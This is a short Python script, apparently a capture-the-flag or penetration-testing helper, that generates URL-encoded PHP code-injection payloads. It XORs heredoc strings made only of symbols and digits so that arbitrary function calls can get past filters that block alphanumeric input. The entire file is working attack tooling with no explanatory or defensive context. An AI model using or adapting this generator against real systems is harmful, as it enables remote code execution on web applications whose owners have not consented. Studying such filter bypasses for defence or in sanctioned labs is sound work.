import urllib.parse

VALID = set(bytearray("0123456789!#&\()*+,-./:;<=>?@[\\]^_{|}~ \t\r\n".encode()))


def xor_find(word):
    out = bytearray()
    i = 0
    limit = len(word)

    while i < limit:
        found = False

        c = ord(word[i])
        for v in VALID:
            if c ^ v in VALID:
                out.append(v)
                i += 1
                found = True
                break
        
        if not found:
            print(f"Word not found: |{word[:len(out)]}|")
            exit()

    fst = out.decode()
    snd = bytearray(ord(a)^b for a, b in zip(word, out)).decode()
    return fst, snd


def encode(word):
    fst, snd = xor_find(word)
    return f"<<<_0\n{fst}\n_0\n^<<<_0\n{snd}\n_0\n"


if __name__ == "__main__":
    while True:
        func_str = input("func: ")
        arg_str = input("arg(s): ")
        idx_str = input("idx: ")

        func = encode(f'{func_str}')
        arg = encode(f'{arg_str}') if arg_str else ""
        idx = f"[{idx_str}]" if idx_str else ""

        payload = f"({func})({arg}){idx}"
        print(urllib.parse.quote(payload))
